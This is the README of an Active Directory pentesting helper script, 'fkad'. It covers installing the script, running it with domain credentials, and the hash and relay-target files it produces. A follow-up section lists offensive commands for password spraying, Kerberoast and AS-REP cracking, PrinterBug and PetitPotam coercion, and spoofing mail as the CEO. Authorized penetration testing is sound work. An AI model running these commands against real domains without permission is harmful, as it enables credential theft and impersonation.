# fkad

![fkad](https://github.com/user-attachments/assets/b1e3375e-75f1-46e2-9616-4c469f9fe5b1)


`fkad` is a small offensive helper script designed for exegol docker containers and pentesting instances. It automates common and mundane enumeration tasks, executes sanity checks and prepares artifacts for follow-up toolkits. 

## Quick install & run

```bash
wget https://raw.githubusercontent.com/fkxdr/fkad/refs/heads/main/fkad.sh
chmod +x fkad.sh
./fkad.sh -u <user> -p '<password>' -d <dc-ip/domain.com>
```

> [!NOTE]
> The -d parameter accepts either a DC IP address or a domain name. If a domain is provided, fkad resolves the PDC via SRV record (_ldap._tcp.pdc._msdcs) automatically.

<img width="2208" height="1166" alt="screen" src="https://github.com/user-attachments/assets/c5742863-ab7e-400a-a386-f3556759f57c" />

Example:

```bash
./fkad.sh -u pentest1 -p 'Pentestpassword123' -d 10.10.2.13
./fkad.sh -u pentest1 -p 'Pentestpassword123' -d domain.com
```

## Output / Report

`fkad` creates a timestamped output directory within the workspace:

```
/workspace/fkad_<domain>_YYYYMMDD_HHMMSS
```

Inside you will find:

* `domain_users.txt` - active users enumerated from the domain
* `user_descriptionts.txt` - users with the description field set
* `relay_targets.txt` - hosts without SMB signing
* `kerberoast.txt` - Kerberoastable hashes
* `asrep.txt` - AS-REP hashes
* `timeroast.txt` - Timeroasted hashes
* `adcs_certipy.txt` - Vulnerable ADCS teampltes
* `owned` - single-line credential entry used by GriffonAD (format: `SAM:TYPE:SECRET` for users; computers require hex secret).
* `*.json` - BloodHound JSON files.
* `bloodhound.zip` - Zipped JSONs for BloodHound CE import
* `griffon_output.txt` / `griffon_paths.txt` — GriffonAD results


> [!NOTE]
> When copying the Griffon commands printed in shell, prefer the one with expanded filenames if your shell rejects unexpanded globs.

## Requirements

* `bloodhound-python` (or `bloodhound.py`) for collecting JSONs.
* `ldapsearch`, `nxc` tool (or equivalent SMB/LDAP discovery) installed and in `$PATH`.
* `python3` for running GriffonAD if available.
* `certipy`, `krbrelayx`, `kerbrute`, `rpcdump.py`, `PetitPotam.py`, `GriffonAD` for extended checks and follow-ups.

## Follow-Up Commands

fkad prints exploitation commands inline. Common follow-ups:

```sh
# Password Spraying
kerbrute passwordspray -d <domain> domain_users.txt --user-as-pass

# Crack Kerberoast
hashcat -m 13100 kerberoast.txt rockyou.txt -r best64.rule

# Crack AS-REP
hashcat -m 18200 asrep.txt rockyou.txt

# PrinterBug (requires UD target)
printerbug.py domain/user:pass@dc-ip <listener>

# PetitPotam (requires UD target)
petitpotam.py -d domain -u user -p pass <listener> <dc-ip>

# Email Spoofing
swaks --to target@domain --from ceo@domain --server <mx>
```

## Security / Legal

This tool is for authorized security testing, research, and defensive validation only. Do not use it against systems you do not own or do not have explicit permission to test. The author is not responsible for misuse.

## Credits

- [Ghost SPNs - Semperis](https://www.semperis.com/blog/exploiting-ghost-spns-and-kerberos-reflection-for-smb-server-privilege-elevation/)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound) / [bloodhound-python](https://github.com/dirkjanm/BloodHound.py)
- [GriffonAD](https://github.com/shellinvictus/GriffonAD)
- [Certipy](https://github.com/ly4k/Certipy)
- [NetExec](https://github.com/Pennyw0rth/NetExec)
- [PetitPotam](https://github.com/topotam/PetitPotam)
- [kerbrute](https://github.com/ropnop/kerbrute)
